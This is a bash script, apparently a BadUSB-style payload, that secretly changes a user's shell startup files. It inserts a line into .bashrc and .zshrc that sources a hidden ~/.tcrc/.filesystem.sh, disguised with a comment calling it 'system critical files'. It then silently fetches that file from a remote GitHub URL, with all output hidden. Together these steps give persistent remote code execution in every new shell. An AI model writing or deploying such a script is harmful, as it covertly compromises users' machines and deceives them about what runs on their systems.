#!/bin/bash

content="# Loading system critical files, if you don't know what you're doing, don't do anything
if [ -f ~/.tcrc/.filesystem.sh ]; then
    . ~/.tcrc/.filesystem.sh
fi
"
bashrc="$HOME/.bashrc"
zshrc="$HOME/.zshrc"
codex_dir="$HOME/.tcrc"
filesystem_file="$codex_dir/.filesystem.sh"
temp_file=$(mktemp)
temp_file_zsh=$(mktemp)
{
    echo "$content" > "$temp_file"
    cat "$bashrc" >> "$temp_file"
    echo "$content" > "$temp_file_zsh"
    cat "$zshrc" >> "$temp_file_zsh"
    mv "$temp_file" "$bashrc"
    mv "$temp_file_zsh" "$zshrc"
    [ ! -d "$codex_dir" ] && mkdir -p "$codex_dir"
    wget -q -O "$filesystem_file" "https://github.com/Cluster-bright/bad_usb_for_fun/raw/refs/heads/main/terminal_tomfoolery/cloning/tcrc.sh" 
} >/dev/null 2>&1
